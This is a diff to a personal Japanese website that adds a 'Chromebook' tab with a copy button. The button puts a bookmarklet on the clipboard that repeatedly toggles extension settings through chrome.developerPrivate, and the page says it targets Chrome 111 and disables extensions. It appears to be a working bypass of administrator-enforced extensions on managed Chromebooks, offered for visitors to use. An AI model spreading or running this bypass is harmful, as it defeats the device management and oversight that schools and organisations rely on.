@@ -51,9 +51,49 @@ input:checked + .tab_class {
 input:checked + .tab_class + .content_class {
   display: block;
 }
- 
+.success-msg {
+    display: none;
+    position: fixed;
+    width: 300px;
+    height: 40px;
+    line-height: 40px;
+    background-color: #29aba4;
+    color: #fff;
+    top: 100px;
+    left: 0;
+    right: 0;
+    margin: auto;
+    text-align: center;
+    border-radius: 5px;
+}
    
   </style>
+  <script language="javascript" type="text/javascript">
+    function test() {
+      let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
+    }
+    const button = document.querySelector('#button')
+button.addEventListener('click', () => {
+  navigator.clipboard.writeText('javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);')
+  button.innerHTML = 'コピー完了！'
+  setTimeout(() => button.innerHTML = 'コピー', 1000)
+})
+function op(){
+
+if(window.confirm('コピーされました')){
+
+ 
+
+}
+
+else{
+
+  window.alert('コピーされました'); 
+}
+
+
+}
+</script>
 </head>
 
 <body>
@@ -96,8 +136,22 @@ input:checked + .tab_class + .content_class {
         <label class="tab_class" for="tab1">現在制作中</label>
         <div class="content_class">
           <p><h1>メインページは現在制作中です
-          </h1><br><h2>となりの壁紙は完成したので見てみてね</h2><h4>追記:タブ機能めんどいｗスマホで表示できるようにしたらおかしくなったしｗ</h4></p>
+          </h1><br><h2>となりの壁紙は完成したので見てみてね</h2><h4>追記:タブ機能めんどいｗスマホで表示できるようにしたらおかしくなったしｗw</h4></p>
         </div>
+        <input type="radio" name="tab_name" id="tab3" >
+        <label class="tab_class" for="tab3">Chromebook</label>
+        <div class="content_class">
+          <p>
+            <h2>Chromeバージョン111で動作します
+            </h2>
+            <h3>拡張機能を無効化一</h3>
+            <div class="bookmarklet">
+              <h3></h3><img src="" align="right">
+              <p>テスト版ですまだ公開していません</p>
+              <a class="button" id="button" href="javascirpt:op();">コピー</a>
+            </div>
+          
+          </p></div>
         <input type="radio" name="tab_name" id="tab2" >
         <label class="tab_class" for="tab2">壁紙</label>
         <div class="content_class">
